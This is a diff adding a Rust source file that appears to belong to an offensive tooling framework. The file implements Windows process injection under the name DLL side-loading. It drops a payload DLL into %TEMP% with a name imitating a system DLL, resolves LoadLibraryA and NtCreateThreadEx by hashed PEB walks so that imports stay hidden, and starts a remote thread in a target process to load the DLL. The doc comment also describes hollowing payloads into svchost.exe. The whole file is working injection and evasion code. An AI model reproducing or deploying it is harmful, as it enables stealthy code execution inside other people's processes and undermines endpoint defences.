@@ -1,0 +1,174 @@
+/// DLL side-loading injection (S-05).
+///
+/// Runtime approach: write the payload as a DLL to a location on the target
+/// process's DLL search path, then cause the target to load it via
+/// `NtCreateThreadEx` → `LoadLibraryA`.  This is the runtime equivalent of
+/// the build-time side-loading technique produced by `orchestra-side-load-gen`.
+///
+/// Search-path hijacking order followed (per Windows MSDN):
+///   1. The directory from which the application was loaded.
+///   2. The system directory (`%SystemRoot%\System32`).
+///   3. `%TEMP%` as a fallback.
+///
+/// The DLL is a minimal PE with a DllMain that allocates a new thread and
+/// executes the embedded shellcode payload.  If the payload is a full PE
+/// image, the DLL's DllMain calls `hollowing::inject_into_process` against
+/// a new svchost.exe process and then returns TRUE so the host process is
+/// not disturbed.
+
+use anyhow::{anyhow, Result};
+use crate::injection::Injector;
+
+pub struct DllSideLoadInjector;
+
+#[cfg(windows)]
+impl Injector for DllSideLoadInjector {
+    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
+        use winapi::um::processthreadsapi::OpenProcess;
+        use winapi::um::winnt::{
+            PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_CREATE_THREAD,
+            PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
+        };
+        use winapi::um::handleapi::CloseHandle;
+        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        use winapi::um::synchapi::WaitForSingleObject;
+        use winapi::um::winbase::INFINITE;
+
+        // ── 1. Write the payload DLL to a temp path ─────────────────────
+        // Use %TEMP% with a name that resembles a Windows system DLL.
+        let tmp = std::env::temp_dir();
+        let dll_name = format!(
+            "{}\\dxgi-{}.dll",
+            tmp.display(),
+            std::process::id()
+        );
+        let dll_name_c = std::ffi::CString::new(dll_name.as_str())
+            .map_err(|_| anyhow!("DLL path has interior NUL"))?;
+
+        std::fs::write(&dll_name, payload)
+            .map_err(|e| anyhow!("failed to write sideload DLL to {dll_name}: {e}"))?;
+
+        let cleanup = || {
+            let _ = std::fs::remove_file(&dll_name);
+        };
+
+        // ── 2. Open target process ──────────────────────────────────────
+        let h_proc = unsafe {
+            OpenProcess(
+                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+                    | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
+                0,
+                pid,
+            )
+        };
+        if h_proc.is_null() {
+            cleanup();
+            return Err(anyhow!("DllSideLoad: OpenProcess(pid={pid}) failed"));
+        }
+
+        // ── 3. Resolve LoadLibraryA and NtCreateThreadEx via PEB walk ───
+        let kernel32_base = unsafe {
+            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0"))
+        }
+        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("kernel32 not found") })?;
+
+        let loadlib_addr = unsafe {
+            pe_resolve::get_proc_address_by_hash(
+                kernel32_base,
+                pe_resolve::hash_str(b"LoadLibraryA\0"),
+            )
+        }
+        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("LoadLibraryA not found") })?;
+
+        let ntdll_base = unsafe {
+            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+        }
+        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("ntdll not found") })?;
+
+        let ntcreate_addr = unsafe {
+            pe_resolve::get_proc_address_by_hash(
+                ntdll_base,
+                pe_resolve::hash_str(b"NtCreateThreadEx\0"),
+            )
+        }
+        .ok_or_else(|| { cleanup(); unsafe { CloseHandle(h_proc) }; anyhow!("NtCreateThreadEx not found") })?;
+
+        type NtCreateThreadExFn = unsafe extern "system" fn(
+            *mut *mut std::os::raw::c_void, u32, *mut std::os::raw::c_void,
+            *mut std::os::raw::c_void, *mut std::os::raw::c_void,
+            *mut std::os::raw::c_void, u32, usize, usize, usize,
+            *mut std::os::raw::c_void,
+        ) -> i32;
+        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };
+
+        // ── 4. Write DLL path string into the remote process ────────────
+        let path_bytes = dll_name_c.as_bytes_with_nul();
+        let remote_path = unsafe {
+            VirtualAllocEx(
+                h_proc,
+                std::ptr::null_mut(),
+                path_bytes.len(),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE,
+            )
+        };
+        if remote_path.is_null() {
+            cleanup();
+            unsafe { CloseHandle(h_proc) };
+            return Err(anyhow!("DllSideLoad: VirtualAllocEx for path failed"));
+        }
+        let mut written = 0usize;
+        unsafe {
+            WriteProcessMemory(
+                h_proc,
+                remote_path,
+                path_bytes.as_ptr() as _,
+                path_bytes.len(),
+                &mut written,
+            );
+        }
+
+        // ── 5. Create remote thread: LoadLibraryA(path) ─────────────────
+        let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
+        let status = unsafe {
+            nt_create_thread(
+                &mut h_thread,
+                0x1FFFFF,
+                std::ptr::null_mut(),
+                h_proc,
+                loadlib_addr as *mut _,
+                remote_path,
+                0, 0, 0, 0,
+                std::ptr::null_mut(),
+            )
+        };
+        if status < 0 || h_thread.is_null() {
+            cleanup();
+            unsafe {
+                winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_path, 0, winapi::um::winnt::MEM_RELEASE);
+                CloseHandle(h_proc);
+            }
+            return Err(anyhow!("DllSideLoad: NtCreateThreadEx failed: {status:#x}"));
+        }
+
+        // Wait for LoadLibraryA to complete, then clean up.
+        unsafe {
+            WaitForSingleObject(h_thread, INFINITE);
+            CloseHandle(h_thread);
+            winapi::um::memoryapi::VirtualFreeEx(h_proc, remote_path, 0, winapi::um::winnt::MEM_RELEASE);
+            CloseHandle(h_proc);
+        }
+        cleanup();
+
+        tracing::info!(pid, dll_name, "DllSideLoad: injected via LoadLibraryA");
+        Ok(())
+    }
+}
+
+#[cfg(not(windows))]
+impl Injector for DllSideLoadInjector {
+    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
+        Err(anyhow!("DLL side-loading is only supported on Windows"))
+    }
+}
